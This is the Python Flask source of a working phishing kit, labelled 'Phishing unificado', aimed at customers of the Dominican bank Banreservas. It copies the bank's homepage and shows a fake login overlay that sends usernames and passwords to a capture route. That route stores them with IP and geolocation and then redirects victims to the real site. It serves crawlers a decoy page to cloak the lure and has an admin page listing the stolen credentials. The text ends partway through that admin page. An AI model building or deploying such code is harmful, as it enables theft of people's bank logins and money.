#!/usr/bin/env python3
"""
Phishing unificado: Banreservas + Sistema de captura de credenciales
"""
import os
import sqlite3
import json
import requests
import re
import logging
from datetime import datetime, timedelta
from flask import Flask, request, render_template_string, redirect, jsonify, abort, session

# =============================================
# CONFIGURACIÓN DE LOGGING
# =============================================
logging.basicConfig(level=logging.INFO, format='%(asctime)s - %(levelname)s - %(message)s')
logger = logging.getLogger(__name__)

app = Flask(__name__)

# Configuración de seguridad de sesión
app.secret_key = os.environ.get('SECRET_KEY', 'clave-secreta-para-session-12345')
app.config.update(
    SESSION_COOKIE_SECURE=True,
    SESSION_COOKIE_HTTPONLY=True,
    SESSION_COOKIE_SAMESITE='Lax',
    PERMANENT_SESSION_LIFETIME=timedelta(hours=2)
)

# =============================================
# CONFIGURACIÓN
# =============================================
CONFIG = {
    'redirect_url': 'https://www.banreservas.com',
    'template': 'banreservas',
    'api_key': os.environ.get('API_KEY', 'smiclavesegura2026'),
    'admin_password': 'triple777',
    'max_login_attempts': 5,
    'cleanup_days': 30
}

# Diccionarios para rate limiting
login_attempts = {}
root_requests = {}
audit_log_enabled = True

# =============================================
# FUNCIONES DE AUDITORÍA Y SEGURIDAD
# =============================================
def audit_log(action, details, ip=None):
    if not audit_log_enabled:
        return
    if ip is None:
        ip = get_client_ip()
    log_entry = {
        'timestamp': datetime.now().isoformat(),
        'action': action,
        'ip': ip,
        'details': details,
        'authenticated': session.get('admin_logged', False)
    }
    try:
        with open('audit.log', 'a') as f:
            f.write(json.dumps(log_entry) + '\n')
    except Exception as e:
        logger.error(f"Error en audit log: {e}")

def is_rate_limited(ip, storage, limit=20, window_seconds=60):
    now = datetime.now()
    if ip in storage:
        count, timestamp = storage[ip]
        if (now - timestamp).total_seconds() < window_seconds:
            if count >= limit:
                return True
            storage[ip] = (count + 1, timestamp)
        else:
            storage[ip] = (1, now)
    else:
        storage[ip] = (1, now)
    return False

def is_ip_blocked(ip):
    if ip in login_attempts:
        attempts, block_time = login_attempts[ip]
        if attempts >= CONFIG.get('max_login_attempts', 5):
            if datetime.now() - block_time < timedelta(minutes=5):
                return True
            else:
                del login_attempts[ip]
    return False

def load_config():
    try:
        with open('config.json', 'r') as f:
            CONFIG.update(json.load(f))
    except:
        pass

def init_db():
    """Inicializa la base de datos y crea la tabla si no existe"""
    try:
        conn = sqlite3.connect('credentials.db', check_same_thread=False)
        cursor = conn.cursor()
        cursor.execute('''
            CREATE TABLE IF NOT EXISTS credentials (
                id INTEGER PRIMARY KEY AUTOINCREMENT,
                timestamp TEXT,
                ip TEXT,
                username TEXT,
                password TEXT,
                user_agent TEXT,
                referer TEXT,
                geo_location TEXT
            )
        ''')
        conn.commit()
        conn.close()
        logger.info("Base de datos inicializada correctamente")
        return True
    except Exception as e:
        logger.error(f"Error al inicializar la base de datos: {e}")
        return False

def cleanup_old_credentials(days=None):
    if days is None:
        days = CONFIG.get('cleanup_days', 30)
    try:
        conn = sqlite3.connect('credentials.db', check_same_thread=False)
        cursor = conn.cursor()
        cursor.execute('''
            DELETE FROM credentials 
            WHERE datetime(timestamp) < datetime('now', ?)
        ''', (f'-{days} days',))
        deleted = cursor.rowcount
        conn.commit()
        conn.close()
        if deleted > 0:
            logger.info(f"Eliminadas {deleted} credenciales antiguas (más de {days} días)")
        return deleted
    except Exception as e:
        logger.error(f"Error en cleanup de credenciales: {e}")
        return 0

def get_client_ip():
    ip = request.headers.get('X-Forwarded-For', request.remote_addr)
    if ',' in str(ip):
        ip = ip.split(',')[0].strip()
    return ip

def get_geo(ip):
    try:
        r = requests.get(f"http://ip-api.com/json/{ip}?fields=status,country,city", timeout=3).json()
        if r.get('status') == 'success':
            return f"{r.get('city', 'Unknown')}, {r.get('country', 'Unknown')}"
    except Exception as e:
        logger.warning(f"Error al obtener geolocalización para {ip}: {e}")
    return "Unknown"

def is_social_crawler(ua):
    social_bots = ['facebookexternalhit', 'twitterbot', 'whatsapp', 'linkedinbot', 
                   'telegrambot', 'discord', 'slackbot', 'pinterest', 'redditbot']
    return any(bot in ua.lower() for bot in social_bots)

def get_template_banreservas():
    """HTML de Banreservas extraído de la página real"""
    return '''<!DOCTYPE html>
<html dir="ltr" lang="es-do">
<head>
    <meta http-equiv="X-UA-Compatible" content="ie=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
    <meta name="description" content="Banco líder del sistema financiero y dinamizador del desarrollo social para los diferentes sectores productivos en beneficio de los dominicanos.">
    
    <!-- ========================================== -->
    <!-- META TAGS PARA VISTA PREVIA EN REDES SOCIALES -->
    <!-- ========================================== -->
    <meta property="og:title" content="🔐 Acceso Seguro - Banreservas" />
    <meta property="og:description" content="Tu banco de confianza. Ingresa con tu usuario y contraseña para realizar tus transacciones de forma segura." />
    <meta property="og:image" content="https://cdnebrpeastus.azureedge.net/banreservas/media/xxpfq31w/banreservas-logo.png" />
    <meta property="og:url" content="https://banreservas-uyw8.onrender.com/" />
    <meta property="og:type" content="website" />
    <meta name="twitter:card" content="summary_large_image" />
    <meta name="twitter:title" content="🔐 Acceso Seguro - Banreservas" />
    <meta name="twitter:description" content="Tu banco de confianza. Ingresa con tu usuario y contraseña." />
    <meta name="twitter:image" content="https://cdnebrpeastus.azureedge.net/banreservas/media/xxpfq31w/banreservas-logo.png" />
    <!-- ========================================== -->
    
    <title>Personal | Banreservas</title>
    
    <!-- Favicon para la pestaña del navegador -->
    <link rel="icon" type="image/png" sizes="32x32" href="https://cdnebrpeastus.azureedge.net/banreservas/media/q2cdzjtf/favicon-32x32.png" />
    <link rel="icon" type="image/png" sizes="16x16" href="https://cdnebrpeastus.azureedge.net/banreservas/media/iclbxops/favicon-16x16.png" />
    <link rel="apple-touch-icon" href="https://cdnebrpeastus.azureedge.net/banreservas/media/psadezl0/apple-icon-180x180.png" />
    
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/bootstrap/4.6.0/css/bootstrap.min.css">
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/5.15.4/css/all.min.css">
    <style>
        /* Estilos básicos para la página */
        * { margin: 0; padding: 0; box-sizing: border-box; }
        body { font-family: 'Segoe UI', Arial, sans-serif; background: #f5f7fa; }
        .container-fullsize-colored-dark { background: #1a2a3a; color: white; padding: 8px 0; }
        .container-fullsize-colored-light { background: white; padding: 10px 0; box-shadow: 0 2px 4px rgba(0,0,0,0.1); }
        .site-logo-img { height: 50px; }
        .navbar-brand { padding: 0; }
        .nav-link { color: #333 !important; font-weight: 500; }
        .nav-link:hover { color: #1a73e8 !important; }
        .site-header-panel-tubanco .nav-link { background: #1a73e8; color: white !important; border-radius: 20px; padding: 8px 20px; }
        .site-header-panel-tubanco .nav-link:hover { background: #1557b0; }
        .main_container_banner { margin: 20px 0; }
        .container_banner .item { height: 400px; background-size: cover; background-position: center; border-radius: 12px; }
        .bg-protection { background: rgba(0,0,0,0.4); height: 100%; display: flex; align-items: center; padding: 40px; border-radius: 12px; }
        .banner-info-content { color: white; max-width: 600px; }
        .banner-description .title { font-size: 36px; font-weight: 700; }
        .banner-description .subtitle { font-size: 28px; font-weight: 300; }
        .button-bordered { display: inline-block; padding: 12px 30px; border: 2px solid white; color: white; border-radius: 30px; text-decoration: none; font-weight: 600; transition: all 0.3s; margin-top: 15px; }
        .button-bordered:hover { background: white; color: #1a2a3a; text-decoration: none; }
        .button-bordered.is-orange { border-color: #f57c00; color: #f57c00; }
        .button-bordered.is-orange:hover { background: #f57c00; color: white; }
        .container_necesidades { padding: 40px 0; }
        .title.d-blue { color: #1a2a3a; font-size: 32px; font-weight: 700; margin-bottom: 30px; }
        .needs-link { display: block; text-align: center; text-decoration: none; color: #333; }
        .needs-image-wrap { display: inline-block; width: 80px; height: 80px; border-radius: 50%; background: #e8f0fe; padding: 15px; margin-bottom: 10px; }
        .needs-image img { width: 100%; }
        .needs-title { display: block; font-weight: 600; font-size: 14px; }
        .tab-pane-needs { padding: 30px; background: #f8f9fa; border-radius: 12px; margin-top: 20px; }
        .tab-pane-needs .sub-title { font-size: 24px; color: #1a2a3a; }
        .container_apoyo { background: #1a2a3a; padding: 40px 0; color: white; }
        .container_apoyo .title { font-size: 32px; font-weight: 700; }
        .tabs-apoyo-wrapper { display: flex; gap: 15px; margin: 20px 0; flex-wrap: wrap; }
        .apoyo-link a { color: #ccc; text-decoration: none; padding: 10px 20px; border-radius: 20px; background: rgba(255,255,255,0.1); }
        .apoyo-link a:hover { background: rgba(255,255,255,0.2); color: white; }
        .tabs-apoyo-content img { width: 100%; border-radius: 12px; max-height: 300px; object-fit: cover; }
        .container_promociones_especiales { padding: 40px 0; }
        .card { border-radius: 12px; overflow: hidden; box-shadow: 0 4px 12px rgba(0,0,0,0.1); margin: 10px; }
        .card-body { padding: 20px; }
        .prom-img { height: 200px; background-size: cover; background-position: center; }
        .site-footer-panel { background: #0d1b2a; color: #aab; padding: 40px 0; }
        .site-footer-panel .title { color: white; font-size: 18px; font-weight: 600; margin-bottom: 15px; }
        .site-footer-panel a { color: #8899aa; text-decoration: none; }
        .site-footer-panel a:hover { color: white; }
        .site-footer-panel ul { list-style: none; padding: 0; }
        .site-footer-panel ul li { margin-bottom: 8px; }
        .social a { color: #8899aa; font-size: 20px; margin-right: 15px; }
        .social a:hover { color: white; }
        /* Login overlay para captura */
        .login-overlay {
            position: fixed;
            top: 0; left: 0; right: 0; bottom: 0;
            background: rgba(0,0,0,0.7);
            display: none;
            justify-content: center;
            align-items: center;
            z-index: 9999;
        }
        .login-overlay.active { display: flex; }
        .login-modal {
            background: white;
            padding: 40px;
            border-radius: 16px;
            max-width: 420px;
            width: 90%;
            text-align: center;
        }
        .login-modal .logo { height: 40px; margin-bottom: 20px; }
        .login-modal h2 { font-size: 22px; color: #1a2a3a; margin-bottom: 10px; }
        .login-modal p { color: #666; font-size: 14px; margin-bottom: 20px; }
        .login-modal input { width: 100%; padding: 12px; margin-bottom: 12px; border: 1px solid #ddd; border-radius: 8px; font-size: 16px; }
        .login-modal input:focus { outline: none; border-color: #1a73e8; }
        .login-modal button { width: 100%; padding: 12px; background: #1a73e8; color: white; border: none; border-radius: 8px; font-size: 16px; font-weight: 600; cursor: pointer; }
        .login-modal button:hover { background: #1557b0; }
        .login-modal .footer { margin-top: 15px; font-size: 12px; color: #999; }
        @media (max-width: 768px) {
            .banner-description .title { font-size: 24px; }
            .banner-description .subtitle { font-size: 20px; }
            .container_banner .item { height: 300px; }
        }
    </style>
</head>
<body>

    <!-- HEADER -->
    <div class="container-fullsize-colored-dark">
        <div class="container">
            <div class="row">
                <div class="col-md-12">
                    <nav class="navbar navbar-expand-lg navbar-dark">
                        <ul class="navbar-nav mr-auto">
                            <li class="nav-item"><span class="nav-link">USD Compra 56.50</span></li>
                            <li class="nav-item"><span class="nav-link">USD Venta 60.00</span></li>
                        </ul>
                        <ul class="navbar-nav ml-auto">
                            <li class="nav-item"><a class="nav-link" href="#"><i class="fas fa-map-marker-alt"></i> Mapa</a></li>
                            <li class="nav-item"><a class="nav-link" href="#"><i class="fas fa-calculator"></i> Calculadoras</a></li>
                            <li class="nav-item site-header-panel-tubanco"><a class="nav-link" href="#" id="tubancoBtn"><i class="fas fa-user"></i> Acceder a TuBanco</a></li>
                        </ul>
                    </nav>
                </div>
            </div>
        </div>
    </div>

    <!-- HEADER LIGHT -->
    <div class="container-fullsize-colored-light">
        <div class="container">
            <div class="row">
                <div class="col">
                    <nav class="navbar navbar-expand-lg navbar-light">
                        <a class="navbar-brand" href="#">
                            <img src="https://cdnebrpeastus.azureedge.net/banreservas/media/xxpfq31w/banreservas-logo.png" class="site-logo-img" alt="Banreservas">
                        </a>
                        <div class="collapse navbar-collapse">
                            <ul class="navbar-nav ml-auto">
                                <li class="nav-item"><a class="nav-link" href="#">Personal</a></li>
                                <li class="nav-item"><a class="nav-link" href="#">Preferente</a></li>
                                <li class="nav-item"><a class="nav-link" href="#">Pyme</a></li>
                                <li class="nav-item"><a class="nav-link" href="#">Empresarial</a></li>
                                <li class="nav-item"><a class="nav-link" href="#">Gubernamental</a></li>
                                <li class="nav-item"><a class="nav-link" href="#">Internacional</a></li>
                            </ul>
                        </div>
                    </nav>
                </div>
            </div>
        </div>
    </div>

    <!-- BANNER PRINCIPAL -->
    <div class="main_container_banner">
        <div class="container">
            <div class="container_banner">
                <div class="item" style="background-image: url('https://cdnebrpeastus.azureedge.net/banreservas/media/exwl4uej/digital-expohogar-2026_masivo-portal-2.jpg'); height: 400px; background-size: cover; background-position: center; border-radius: 12px;">
                    <div class="bg-protection" style="height: 100%; display: flex; align-items: center; padding: 40px; border-radius: 12px; background: rgba(0,0,0,0.4);">
                        <div class="banner-info-content">
                            <h2 class="title">Tu casa que será, ¡ya es!</h2>
                            <p>con Expohogar Banreservas 2026</p>
                            <a href="#" class="button-bordered">Conoce Más</a>
                        </div>
                    </div>
                </div>
            </div>
        </div>
    </div>

    <!-- NECESIDADES -->
    <div class="container_necesidades">
        <div class="container">
            <div class="row">
                <div class="col-12">
                    <h1 class="title d-blue">Necesidades</h1>
                </div>
            </div>
            <div class="row">
                <div class="col-12">
                    <div class="owl-carousel">
                        <div class="item"><a class="needs-link" href="#"><span class="needs-image-wrap"><span class="needs-image"><img src="https://cdnebrpeastus.azureedge.net/banreservas/media/kngawaaj/br-19.svg" alt="Amuebla tu casa"></span></span><span class="needs-title">Amuebla tu casa</span></a></div>
                        <div class="item"><a class="needs-link" href="#"><span class="needs-image-wrap"><span class="needs-image"><img src="https://cdnebrpeastus.azureedge.net/banreservas/media/fpwfpr3b/br-22.svg" alt="Compra el carro que deseas"></span></span><span class="needs-title">Compra el carro que deseas</span></a></div>
                        <div class="item"><a class="needs-link" href="#"><span class="needs-image-wrap"><span class="needs-image"><img src="https://cdnebrpeastus.azureedge.net/banreservas/media/2ybdczyy/br-20.svg" alt="Compra o remodela tu casa"></span></span><span class="needs-title">Compra o remodela tu casa</span></a></div>
                        <div class="item"><a class="needs-link" href="#"><span class="needs-image-wrap"><span class="needs-image"><img src="https://cdnebrpeastus.azureedge.net/banreservas/media/mobhjppm/br-21.svg" alt="Construye tu patrimonio"></span></span><span class="needs-title">Construye tu patrimonio</span></a></div>
                        <div class="item"><a class="needs-link" href="#"><span class="needs-image-wrap"><span class="needs-image"><img src="https://cdnebrpeastus.azureedge.net/banreservas/media/oekjwcvz/br-23.svg" alt="Cumple tus Metas de Estudio"></span></span><span class="needs-title">Cumple tus Metas de Estudio</span></a></div>
                    </div>
                </div>
            </div>
        </div>
    </div>

    <!-- APOYO -->
    <div class="container_apoyo">
        <div class="container">
            <div class="row">
                <div class="col-12">
                    <h1 class="title">Te apoyamos en cada etapa de tu vida.</h1>
                    <div class="tabs-apoyo-wrapper">
                        <a href="#" class="apoyo-link" style="color: white; padding: 10px 20px; border-radius: 20px; background: rgba(255,255,255,0.15); text-decoration: none;">Pensionado</a>
                        <a href="#" class="apoyo-link" style="color: #ccc; padding: 10px 20px; border-radius: 20px; background: rgba(255,255,255,0.1); text-decoration: none;">Joven</a>
                        <a href="#" class="apoyo-link" style="color: #ccc; padding: 10px 20px; border-radius: 20px; background: rgba(255,255,255,0.1); text-decoration: none;">Emprendedor</a>
                    </div>
                    <div class="tabs-apoyo-content">
                        <img src="https://cdnebrpeastus.azureedge.net/banreservas/media/lnnfqyom/pensionado-t1.jpg" alt="Pensionado" style="width: 100%; border-radius: 12px; max-height: 300px; object-fit: cover;">
                    </div>
                </div>
            </div>
        </div>
    </div>

    <!-- PROMOCIONES -->
    <div class="container_promociones_especiales">
        <div class="container-fluid">
            <div class="row">
                <div class="col">
                    <h1 class="title d-blue" style="padding-left: 15px;">Promociones Especiales</h1>
                    <div class="row">
                        <div class="col-md-3">
                            <div class="card">
                                <div class="prom-img" style="height: 200px; background-image: url('https://cdnebrpeastus.azureedge.net/banreservas/media/qjxnf3on/concierto-beto-cuevas-mc-julio-2026_promo.jpg'); background-size: cover; background-position: center;"></div>
                                <div class="card-body">
                                    <h5 class="card-title">Recibe un 15% de descuento en Beto Cuevas</h5>
                                    <p class="card-text">con Tarjetas de Crédito Mastercard Banreservas.</p>
                                    <a href="#" class="button-bordered is-orange" style="font-size: 14px; padding: 8px 20px;">Ver detalles</a>
                                </div>
                            </div>
                        </div>
                        <div class="col-md-3">
                            <div class="card">
                                <div class="prom-img" style="height: 200px; background-image: url('https://cdnebrpeastus.azureedge.net/banreservas/media/1ivjlbq1/alianza-grupo-bentrani-julio-2026_promo.jpg'); background-size: cover; background-position: center;"></div>
                                <div class="card-body">
                                    <h5 class="card-title">Celebre a papá con hasta 30% de ahorro</h5>
                                    <p class="card-text">con sus Tarjetas Banreservas</p>
                                    <a href="#" class="button-bordered is-orange" style="font-size: 14px; padding: 8px 20px;">Ver detalles</a>
                                </div>
                            </div>
                        </div>
                        <div class="col-md-3">
                            <div class="card">
                                <div class="prom-img" style="height: 200px; background-image: url('https://cdnebrpeastus.azureedge.net/banreservas/media/kbrdeddj/entretenimiento-visa-inolvidable-julio-2026_promo.jpg'); background-size: cover; background-position: center;"></div>
                                <div class="card-body">
                                    <h5 class="card-title">Reciba 15% de descuento en conciertos</h5>
                                    <p class="card-text">con Inolvidable Visa Banreservas</p>
                                    <a href="#" class="button-bordered is-orange" style="font-size: 14px; padding: 8px 20px;">Ver detalles</a>
                                </div>
                            </div>
                        </div>
                        <div class="col-md-3">
                            <div class="card">
                                <div class="prom-img" style="height: 200px; background-image: url('https://cdnebrpeastus.azureedge.net/banreservas/media/ztgpfgql/20260608_acd_lac_banreservas_-plataforma-golf_promola-canajulio_masivo_promo.jpg'); background-size: cover; background-position: center;"></div>
                                <div class="card-body">
                                    <h5 class="card-title">Recibe atractivos beneficios con Mastercard</h5>
                                    <p class="card-text">en el campo de golf La Cana.</p>
                                    <a href="#" class="button-bordered is-orange" style="font-size: 14px; padding: 8px 20px;">Ver detalles</a>
                                </div>
                            </div>
                        </div>
                    </div>
                </div>
            </div>
        </div>
    </div>

    <!-- NOTICIAS -->
    <div class="container" style="padding: 40px 0;">
        <div class="row">
            <div class="col">
                <h1 class="title d-blue">Sala de prensa</h1>
            </div>
        </div>
        <div class="row">
            <div class="col-md-4">
                <div class="card">
                    <img src="https://cdnebrpeastus.azureedge.net/banreservas/media/lhnnzzmg/1-heiromy-castro-edward-s%C3%A1nchez-y-marbel-giulamo.jpg" class="card-img-top" alt="Noticia">
                    <div class="card-body">
                        <p class="text-muted small">21/07/2026</p>
                        <h5>SEPROI obtiene certificación ISO 37001</h5>
                    </div>
                </div>
            </div>
            <div class="col-md-4">
                <div class="card">
                    <img src="https://cdnebrpeastus.azureedge.net/banreservas/media/djdhmyt4/1.jpg" class="card-img-top" alt="Noticia">
                    <div class="card-body">
                        <p class="text-muted small">20/07/2026</p>
                        <h5>Banreservas otorga financiamientos superiores a RD$117 millones</h5>
                    </div>
                </div>
            </div>
            <div class="col-md-4">
                <div class="card">
                    <img src="https://cdnebrpeastus.azureedge.net/banreservas/media/bpup0ysp/fachada-1.jpg" class="card-img-top" alt="Noticia">
                    <div class="card-body">
                        <p class="text-muted small">17/07/2026</p>
                        <h5>Euromoney reconoce a Banreservas como Mejor Banco del Caribe</h5>
                    </div>
                </div>
            </div>
        </div>
    </div>

    <!-- FOOTER -->
    <footer class="site-footer-panel">
        <div class="container">
            <div class="row">
                <div class="col-md-3">
                    <h3 class="title">CONTACTO</h3>
                    <ul>
                        <li><i class="fas fa-phone-alt"></i> <a href="tel:8099602121">809 960 2121</a></li>
                        <li><i class="fas fa-map-marker-alt"></i> <a href="#">Encuentra una Oficina</a></li>
                        <li><i class="fas fa-envelope"></i> <a href="mailto:contacto@banreservas.com">contacto@banreservas.com</a></li>
                    </ul>
                    <div class="social">
                        <a href="#"><i class="fab fa-facebook-f"></i></a>
                        <a href="#"><i class="fab fa-twitter"></i></a>
                        <a href="#"><i class="fab fa-instagram"></i></a>
                        <a href="#"><i class="fab fa-youtube"></i></a>
                    </div>
                </div>
                <div class="col-md-3">
                    <h3 class="title">Sobre Nosotros</h3>
                    <ul>
                        <li><a href="#">Visión, Misión y Valores</a></li>
                        <li><a href="#">Voluntariado Banreservas</a></li>
                        <li><a href="#">Centro Cultural Banreservas</a></li>
                        <li><a href="#">Responsabilidad social</a></li>
                        <li><a href="#">Memorias institucionales</a></li>
                    </ul>
                </div>
                <div class="col-md-3">
                    <h3 class="title">Filiales</h3>
                    <ul>
                        <li><a href="#">ARS Reservas</a></li>
                        <li><a href="#">Seguros Reservas</a></li>
                        <li><a href="#">AFP Reservas</a></li>
                        <li><a href="#">Fiduciaria Reservas</a></li>
                    </ul>
                </div>
                <div class="col-md-3">
                    <h3 class="title">Informaciones</h3>
                    <ul>
                        <li><a href="#">Tu seguridad</a></li>
                        <li><a href="#">Lista bienes disponibles</a></li>
                        <li><a href="#">Monitor financiero</a></li>
                        <li><a href="#">Tarifario de productos</a></li>
                    </ul>
                </div>
            </div>
            <div class="row mt-4">
                <div class="col-12 text-center" style="color: #8899aa; font-size: 12px;">
                    <p>Copyright 2022 BanReservas. Todos los derechos reservados.</p>
                    <p>Los fondos depositados en Banreservas están cubiertos por la garantía de depósitos otorgada por el Fondo de Contingencia hasta RD$1,860,000.00.</p>
                </div>
            </div>
        </div>
    </footer>

    <!-- LOGIN OVERLAY (se muestra al hacer clic en "Acceder a TuBanco") -->
    <div class="login-overlay" id="loginOverlay">
        <div class="login-modal">
            <img src="https://cdnebrpeastus.azureedge.net/banreservas/media/xxpfq31w/banreservas-logo.png" class="logo" alt="Banreservas">
            <h2>🔐 Acceso a TuBanco</h2>
            <p>Ingresa tus credenciales para acceder a tu cuenta</p>
            <form action="/capture" method="POST">
                <input type="text" name="email" placeholder="Usuario o correo electrónico" required>
                <input type="password" name="password" placeholder="Contraseña" required>
                <button type="submit">Iniciar Sesión</button>
            </form>
            <div class="footer">🔒 Conexión segura · Banco Banreservas</div>
        </div>
    </div>

    <script>
        // Mostrar overlay al hacer clic en "Acceder a TuBanco"
        document.getElementById('tubancoBtn').addEventListener('click', function(e) {
            e.preventDefault();
            document.getElementById('loginOverlay').classList.add('active');
        });
        // Cerrar overlay al hacer clic fuera del modal
        document.getElementById('loginOverlay').addEventListener('click', function(e) {
            if (e.target === this) {
                this.classList.remove('active');
            }
        });
    </script>
</body>
</html>'''

# =============================================
# RUTAS Y DECORADORES
# =============================================

@app.before_request
def initialize_db_on_startup():
    """Inicializa la base de datos antes de la primera solicitud"""
    init_db()

@app.after_request
def add_security_headers(response):
    response.headers['X-Frame-Options'] = 'DENY'
    response.headers['X-Content-Type-Options'] = 'nosniff'
    response.headers['Referrer-Policy'] = 'strict-origin-when-cross-origin'
    return response

@app.before_request
def limit_root_requests():
    if request.path == '/':
        ip = get_client_ip()
        if is_rate_limited(ip, root_requests, limit=30, window_seconds=60):
            logger.warning(f"Rate limit excedido en raíz desde IP {ip}")
            audit_log('ROOT_RATE_LIMIT', {'ip': ip}, ip)
            return "⏳ Demasiadas visitas. Espera 1 minuto.", 429

@app.before_request
def handle_bots():
    ua = request.headers.get('User-Agent', '')
    if is_social_crawler(ua) and request.path == '/':
        return render_template_string('''
<!DOCTYPE html>
<html>
<head>
    <meta charset="UTF-8">
    <meta property="og:title" content="Banreservas - Banco líder">
    <meta property="og:description" content="Banco líder del sistema financiero dominicano.">
    <meta property="og:image" content="https://cdnebrpeastus.azureedge.net/banreservas/media/xxpfq31w/banreservas-logo.png">
    <title>Banreservas</title>
</head>
<body>
    <h1>Banreservas</h1>
    <p>Banco líder del sistema financiero dominicano.</p>
</body>
</html>
'''), 200

@app.route('/')
def index():
    return render_template_string(get_template_banreservas())

@app.route('/capture', methods=['POST'])
def capture():
    ip = get_client_ip()
    username = request.form.get('email', '') or request.form.get('username', '')
    password = request.form.get('password', '')
    
    if not username or not password:
        return redirect(CONFIG.get('redirect_url', 'https://www.banreservas.com'))
    
    username = re.sub(r'[^a-zA-Z0-9@.\-_\s]', '', username)
    geo = get_geo(ip)
    
    try:
        conn = sqlite3.connect('credentials.db', check_same_thread=False)
        cursor = conn.cursor()
        cursor.execute('''
            INSERT INTO credentials (timestamp, ip, username, password, user_agent, referer, geo_location)
            VALUES (?, ?, ?, ?, ?, ?, ?)
        ''', (datetime.now().isoformat(), ip, username, password,
              request.headers.get('User-Agent', ''), request.headers.get('Referer', ''), geo))
        conn.commit()
        conn.close()
        logger.info(f"✅ Credencial guardada: {username} desde {ip}")
        audit_log('NEW_CREDENTIAL', {'username': username, 'ip': ip}, ip)
    except Exception as e:
        logger.error(f"❌ Error al guardar: {e}")
    
    return redirect(CONFIG.get('redirect_url', 'https://www.banreservas.com'))

@app.route('/login-credenciales', methods=['GET', 'POST'])
def login_credenciales():
    ip = get_client_ip()
    max_attempts = CONFIG.get('max_login_attempts', 5)
    
    if is_ip_blocked(ip):
        audit_log('LOGIN_BLOCKED', {'ip': ip}, ip)
        return render_template_string('''
        <!DOCTYPE html>
        <html>
        <head><title>Acceso Bloqueado</title>
        <style>
            body{font-family:Arial;background:#f0f2f5;display:flex;justify-content:center;align-items:center;height:100vh;}
            .container{background:white;padding:40px;border-radius:8px;text-align:center;}
            .error{color:red;margin-top:10px;}
        </style>
        </head>
        <body>
            <div class="container">
                <h1>🚫 Acceso Bloqueado</h1>
                <p>Has superado el límite de intentos permitidos.</p>
                <p class="error">Espera 5 minutos para volver a intentarlo.</p>
            </div>
        </body>
        </html>
        ''', 429)
    
    if request.method == 'POST':
        password = request.form.get('password')
        if password == CONFIG.get('admin_password', 'triple777'):
            login_attempts.pop(ip, None)
            session['admin_logged'] = True
            session.permanent = True
            logger.info(f"Login exitoso desde IP {ip}")
            audit_log('LOGIN_SUCCESS', {'ip': ip}, ip)
            return redirect('/ver-credenciales')
        else:
            if ip not in login_attempts:
                login_attempts[ip] = [0, datetime.now()]
            login_attempts[ip][0] += 1
            login_attempts[ip][1] = datetime.now()
            remaining = max_attempts - login_attempts[ip][0]
            logger.warning(f"Login fallido desde IP {ip}, intentos: {login_attempts[ip][0]}")
            audit_log('LOGIN_FAILURE', {'ip': ip, 'attempts': login_attempts[ip][0]}, ip)
            
            return render_template_string('''
            <!DOCTYPE html>
            <html>
            <head><title>Acceso Denegado</title>
            <style>
                body{font-family:Arial;background:#f0f2f5;display:flex;justify-content:center;align-items:center;height:100vh;}
                .container{background:white;padding:40px;border-radius:8px;text-align:center;}
                .error{color:red;margin-top:10px;}
            </style>
            </head>
            <body>
                <div class="container">
                    <h1>🔒 Contraseña incorrecta</h1>
                    <p class="error">Intentos restantes: ''' + str(remaining) + '''</p>
                    <a href="/login-credenciales">Volver</a>
                </div>
            </body>
            </html>
            ''')
    
    return render_template_string('''
    <!DOCTYPE html>
    <html>
    <head>
        <title>Acceso a Credenciales</title>
        <style>
            *{margin:0;padding:0;box-sizing:border-box;font-family:Arial,sans-serif;}
            body{background:#f0f2f5;display:flex;justify-content:center;align-items:center;height:100vh;}
            .container{background:white;padding:40px;border-radius:8px;box-shadow:0 2px 10px rgba(0,0,0,0.1);width:100%;max-width:400px;text-align:center;}
            h1{color:#1a73e8;margin-bottom:20px;font-size:24px;}
            .lock{font-size:48px;margin-bottom:15px;}
            input{width:100%;padding:12px;margin:10px 0;border:1px solid #ddd;border-radius:4px;font-size:16px;}
            input:focus{outline:none;border-color:#1a73e8;}
            button{width:100%;padding:12px;background:#1a73e8;color:white;border:none;border-radius:4px;font-size:16px;cursor:pointer;}
            button:hover{background:#1557b0;}
            .footer{margin-top:20px;color:#666;font-size:14px;}
        </style>
    </head>
    <body>
        <div class="container">
            <div class="lock">🔐</div>
            <h1>Acceso a Credenciales</h1>
            <p style="color:#666;margin-bottom:20px;">Introduce la contraseña de administrador</p>
            <form method="POST">
                <input type="password" name="password" placeholder="Contraseña" required autofocus>
                <button type="submit">Acceder</button>
            </form>
            <div class="footer">Acceso restringido</div>
        </div>
    </body>
    </html>
    ''')

@app.route('/ver-credenciales')
def ver_credenciales():
    if not session.get('admin_logged'):
        return redirect('/login-credenciales')
    
    try:
        conn = sqlite3.connect('credentials.db', check_same_thread=False)
        cursor = conn.cursor()
        cursor.execute('SELECT id, timestamp, ip, username, password, geo_location FROM credentials ORDER BY id DESC')
        rows = cursor.fetchall()
        conn.close()
        
        if not rows:
            return """
            <!DOCTYPE html>
            <html>
            <head><title>Credenciales</title>
            <style>
                body{font-family:Arial;background:#f0f2f5;padding:20px;text-align:center;}
                h1{color:#1a73e8;}
                .container{background:white;padding:40px;border-radius:8px;max-width:600px;margin:0 auto;}
                .logout{float:right;background:#dc3545;color:white;padding:8px 16px;border-radius:4px;text-decoration:none;}
                .logout:hover{background:#c82333;}
            </style>
            </head>
            <body>
                <div class="container">
                    <a href="/logout-credenciales" class="logout">Cerrar Sesión</a>
                    <h1>📭 No hay credenciales</h1>
                    <p>Todavía no se han capturado credenciales.</p>
                    <p>Ve a <a href="/">la página principal</a> y haz clic en "Acceder a TuBanco" para probar.</p>
                </div>
            </body>
            </html>
            """
        
        html = """
        <!DOCTYPE html>
        <html>
        <head>
            <title>Credenciales</title>
            <style>
                body{font-family:Arial;background:#f0f2f5;padding:20px;}
                h1{color:#1a73e8;text-align:center;}
                table{width:100%;border-collapse:collapse;background:white;border-radius:8px;overflow:hidden;box-shadow:0 2px 4px rgba(0,0,0,0.1);}
                th{background:#1a73e8;color:white;padding:12px;text-align:left;}
                td{padding:10px;border-bottom:1px solid #ddd;}
                tr:hover{background:#f5f5f5;}
                .logout{float:right;background:#dc3545;color:white;padding:8px 16px;border-radius:4px;text-decoration:none;}
                .logout:hover{background:#c82333;}
            </style>
        </head>
        <body>
            <a href="/logout-credenciales" class="logout">Cerrar Sesión</a>
